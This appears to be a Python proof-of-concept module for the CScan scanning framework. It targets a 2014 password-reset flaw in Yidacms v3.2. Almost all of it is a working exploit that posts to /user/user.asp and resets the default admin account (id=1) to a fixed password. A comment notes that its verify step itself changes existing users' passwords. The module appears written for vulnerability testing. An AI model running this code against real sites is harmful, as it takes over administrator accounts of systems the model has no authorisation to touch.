# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib

class Vuln(ABVuln):
    vuln_id = 'Yidacms_0001' # 平台漏洞编号，留空
    name = 'Yidacms v3.2 /Yidacms/user/user.asp 远程密码修改漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2014-08-26'  # 漏洞公布时间
    desc = '''
        重置密码时没有对帐号和原密码进行校验,导致可以任意重置任何用户密码。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Yidacms'  # 漏洞应用名称
    product_version = 'v3.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '15796185-bd97-4c75-8e59-1983d9692855'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        #验证的过程就是利用的过程，会修改已有用户密码
        super(Poc, self).exploit()

    def exploit(self):
        try:
            #利用方式是直接修改密码
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #admin的id=1，这是程序默认安装时已经存在账号，直接修改管理员的账号
            vul_path = '%s/user/user.asp?yidacms=password&id=1'
            verify_url = vul_path % self.target

            data = {
                'shuaiweb_userpass':'test@cscan',
                'shuaiweb_userpass2':'test@cscan',
                'shuaiweb_useremail':'test@cscan',
                'shuaiweb_username': urllib.unquote('%CE%D2%B7%AE%BB%AA'),
                'shuaiweb_usertel': '',
                'shuaiweb_userqq': '',
                'shuaiweb_usermsn': '',
                'shuaiweb_useraddress': ''
            }
            response = requests.post(verify_url, data=data)
            content = response.content

            if u'alert(\'修改成功！\');location.replace(\'user_pass.asp\')' in content.decode('GBK'):
                #args['success'] = True
                #args['poc_ret']['vul_url'] = verify_url
                #args['poc_ret']['password'] = 'test@cscan.com'
                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已修改amin用户的密码为：{passwd}'.format(
                    target=self.target, vulnname=self.vuln.name, passwd='test@cscan'))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

if __name__ == '__main__':
    Poc().run()
